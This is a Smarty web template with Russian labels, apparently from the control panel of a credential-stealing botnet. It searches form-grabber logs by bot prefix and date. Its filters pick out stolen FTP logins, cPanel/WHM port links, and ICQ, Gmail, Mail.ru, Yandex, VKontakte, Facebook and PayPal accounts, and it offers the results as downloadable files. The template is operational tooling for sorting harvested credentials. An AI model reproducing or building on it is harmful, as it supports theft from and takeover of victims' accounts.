<div class="top_menu">

<div class="top_menu_left"></div>

<div class="top_menu_right">
{if $smarty.session.user->access.files.search eq on}<a href="/files/search.html"{if $Cur.go eq 'search'} style="color:red"{/if}>Поиск в логах ФГ</a>&nbsp;{/if}
{if $smarty.session.user->access.files.filters eq on}<a href="/files/filters.html"{if $Cur.go eq 'filters'} style="color:red"{/if}>Фильтры</a>&nbsp;{/if}
</div>

</div>
<hr />

<div style="text-align: right; padding-right: 10px; padding-left: 10px">
<form name="search_fg" id="search_fg" action="#" method="post" enctype="application/x-www-form-urlencoded">
Префикс: <select id="prefix" name="prefix" style="width:600px">
<option value="*">Любой</option>
</select>
<hr />
Фильтр: <select name="type" style="width:600px">
<option value="ftp">ФТП</option>
<option value="ports">Ссылки с портами 777,2222,2082,2083,2086,2087</option>
<option value="icq">ICQ</option>
<option value="msn">MSN</option>
<option value="vkontakte">ВКонтакте.ру</option>
<option value="odnoklassniki">Одноклассники.ру</option>
<option value="torrents">Торренс.ру и RuTacker.org</option>
<option value="depositfiles">DepositFiles.com</option>
<option value="rapidshare">RapidShare.com и RapidShare.de</option>
<option value="gmail">GMail.com</option>
<option value="mailru">Mail.ru</option>
<option value="yandexru">Yandex.ru</option>
<option value="paypal">PayPal</option>
<option value="facebook">FaceBook.com</option>
 </select>
<hr />
Дата: <span id="date_search_set">{html_select_date field_order="DMY" prefix="data[]"} - {html_select_date field_order="DMY" prefix="data[]"}<br /></span><label for="data">Любая: </label><input id="data" name="data" type="checkbox" value="*" onclick="check_date(this);" />
<hr />
<input type="button" name="add" value="Добавить" style="width:70%" onclick="add_filter();" />&nbsp;<input type="button" name="button" value="Запустить вручную скрипт поиска" style="width:280px" onclick="start_filters();" />
</form>
</div>
<br /><br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc; text-align: center; font-size:10px">
<tr class="bgp3">
<td style="width: 130px;">Префикс</td>
<td style="width: 170px;">Дата</td>
<td style="width: 150px;">Тип поиска</td>
<td style="width: 150px;">Статус</td>
<td style="width: 1px;"></td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$key}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF;">
<th>{if $item->prefix eq '*'}Любой{else}{$item->prefix}{/if}</th>
<th>{if $item->date eq '*'}Любая{else}{$item->date}{/if}</th>
<th>{$item->sparam}</th>
<th title="{if $item->status eq 0}Ожидание{elseif $item->status eq 1}Запуск{elseif $item->status eq 2}Идет поиск ({$item->queued} из {$item->finished}){elseif $item->status eq 3}Завершено{elseif $item->status eq 4}Ошибка{/if}">{if $item->status eq 0}Ожидание{elseif $item->status eq 1}Запуск{elseif $item->status eq 2}{math equation="x / y * 100" x=$item->finished y=$item->queued format="%.2f"}%{elseif $item->status eq 3}<a href="/cache/filters/{$item->id}.txt" target="_blank">Скачать</a>{elseif $item->status eq 4}Ошибка{/if}</th>
<th>{if $item->status eq '0' or $item->status eq '1' or $item->status eq '3' or $item->status eq '4'}
<a href="#" onclick="if(confirm('Действительно удалить?')) get_hax({ldelim}url: '/files/filters-{$item->id}.html?ajax=1'{rdelim});"><img src="/images/delete.png" alt="Удалить" title="Удалить" border="0" /></a>{else}&nbsp;{/if}</th>
</tr>
{/foreach}
</table>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>